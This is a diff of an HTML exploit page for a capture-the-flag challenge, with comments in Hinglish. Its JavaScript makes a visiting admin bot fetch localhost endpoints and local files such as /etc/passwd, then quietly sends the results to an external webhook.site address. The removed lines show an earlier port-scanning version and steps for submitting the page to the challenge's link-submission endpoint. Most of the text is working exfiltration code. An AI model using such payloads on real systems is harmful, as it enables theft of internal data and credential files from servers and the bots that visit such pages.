@@ -3,82 +3,40 @@
 <body>
 <script>
 var w = 'https://webhook.site/3ebc554f-f359-45f5-9b7f-d60cd8539ca8';
-var ctf = 'http://151.115.166.43:18920';
 
-// Method 1: Bot ko internal URLs pe bhejo
-var internalUrls = [
-  ctf + '/flag',
-  ctf + '/api/flag', 
+// Bot server pe hai - localhost fetch karo
+var targets = [
   'http://localhost:18920/flag',
   'http://127.0.0.1:18920/flag',
   'http://localhost:18920/api/flag',
   'http://127.0.0.1:18920/api/flag',
-  'http://localhost:18920/admin',
-  'http://127.0.0.1:18920/admin'
+  'http://localhost:18920/api/secret',
+  'http://localhost:18920/api/admin',
+  'http://localhost:18920/api/bot-profile',
+  'http://localhost:18920/api/llm-profile',
+  'http://localhost:3000/flag',
+  'http://localhost:5000/flag',
+  'http://localhost:8080/flag',
+  'file:///flag',
+  'file:///etc/passwd',
+  'file:///flag.txt',
+  'file:///app/flag',
+  'file:///app/flag.txt'
 ];
 
-// Image tag CORS bypass karta hai
-internalUrls.forEach(function(url) {
-  var img = new Image();
-  img.src = url + '?callback=' + encodeURIComponent(w);
-  document.body.appendChild(img);
+targets.forEach(function(url) {
+  fetch(url)
+    .then(function(r) { 
+      return r.text(); 
+    })
+    .then(function(d) {
+      // Data mila!
+      new Image().src = w + '?url=' + encodeURIComponent(url) + '&data=' + encodeURIComponent(d.substring(0,300));
+    })
+    .catch(function(e) {
+      // Silently fail
+    });
 });
-
-// Method 2: Bot ko redirect karo localhost pe
-// Agar koi internal service chal rahi ho
-setTimeout(function() {
-  // Bot ka browser localhost access kar sakta hai!
-  fetch('http://localhost:18920/flag')
-    .then(r => r.text())
-    .then(d => new Image().src = w + '?flag=' + encodeURIComponent(d))
-    .catch(e => new Image().src = w + '?localhost_err=' + encodeURIComponent(e));
-    
-  fetch('http://localhost:18920/api/flag')
-    .then(r => r.text())
-    .then(d => new Image().src = w + '?flag2=' + encodeURIComponent(d))
-    .catch(e => {});
-
-  // Internal ports try karo
-  [3000, 5000, 8000, 8080, 4000, 9000].forEach(function(port) {
-    fetch('http://localhost:' + port + '/flag')
-      .then(r => r.text())
-      .then(d => new Image().src = w + '?port=' + port + '&d=' + encodeURIComponent(d))
-      .catch(e => {});
-  });
-}, 500);
 </script>
 </body>
 </html>
-```
-
----
-
-## Step 3 — Submit karo
-
-`http://151.115.166.43:18920/link-submission` pe jao:
-```
-https://viveksharma-cs.github.io/ctf/
-```
-
----
-
-## Step 4 — Webhook dekho
-
-`?flag=` ya `?port=` wale requests mein flag hoga!
-
----
-
-## Parallel mein ye bhi try karo
-
-CTF link submission mein **directly ye URLs submit karo** (ek ek karke):
-```
-http://localhost:18920/flag
-```
-```
-http://127.0.0.1:18920/flag
-```
-```
-http://localhost:18920/api/flag
-```
-```
-http://0.0.0.0:18920/api/secret
